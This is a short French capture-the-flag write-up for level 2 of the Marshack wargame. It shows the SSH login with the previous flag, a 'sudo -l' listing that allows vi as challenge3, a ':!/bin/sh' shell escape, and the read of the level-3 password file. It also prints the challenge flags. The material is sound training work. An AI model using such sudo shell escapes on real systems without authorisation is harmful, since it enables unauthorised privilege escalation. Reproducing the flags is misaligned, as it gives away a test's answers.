# Write up : Wargames

### Level 2


Consigne :

```
Consignes lvl2 :<br>
Le but de ce challenge est de devenir l'utilisateur challenge3 en utilisant la  commande disponible via 'sudo -l'.<br>

Se connecter à l'adresse suivante : <br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<FONT COLOR="#ff0000">ssh -p 6666 challenge2@game1.marshack.fr</FONT> <br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;password : [flag obtenu dans l'épreuve précédente]
```

Connexion 

```bash
ssh -p 6666 challenge2@game1.marshack.fr
password: MARS{hloiO6JJKCRcDPL8YHsBkENGxxRtESQ3}
```

Contrôle de l'uid

```
challenge2@b36757fe226e:~$ id

uid=1001(challenge2) gid=1001(challenge2) groups=1001(challenge2)
```

Visualisation des privilèges : sudo -l

```
challenge2@b36757fe226e:~$ sudo -l

  User challenge2 may run the following commands on e63bbe56ea83:
  (challenge3) NOPASSWD: /usr/bin/vi
```

C'est une élévation de privilèges basique via le binaire vi.

```
sudo -u challenge3 /usr/bin/vi
```

Ouverture d'un shell dans vi.

```
:!/bin/sh
```

Exécuter ensuite les commandes permettant : 

- la vérification de l'id
- l'affichage du password

```
$ id
uid=1002(challenge3) gid=1002(challenge3) groups=1002(challenge3)

$ cat /etc/wargames_pass/level3/level3_password

    MARS{Z0jU71sabjJ9DHzLEVV3nLoVibLS1wC9}
```

Contenu du répertoire /etc/wargames_pass

```bash
drwxr-x--- 1 root root       4096 oct.  28 13:25 level10
drwxr-x--- 1 root root       4096 oct.  28 13:25 level11
drwxr-x--- 1 root root       4096 oct.  28 13:25 level2
drwxr-x--- 1 root challenge3 4096 oct.  28 13:25 level3     <== challenge3 a accès au contenu
drwxr-x--- 1 root root       4096 oct.  28 13:25 level4
drwxr-x--- 1 root root       4096 oct.  28 13:25 level5
drwxr-x--- 1 root challenge6 4096 oct.  28 13:25 level6     <== challenge6 a accès au contenu
drwxr-x--- 1 root root       4096 oct.  28 13:25 level7
drwxr-x--- 1 root root       4096 oct.  28 13:25 level8
drwxr-x--- 1 root challenge9 4096 oct.  28 13:25 level9     <== challenge9 a accès au contenu
```



Résultat : MARS{Z0jU71sabjJ9DHzLEVV3nLoVibLS1wC9}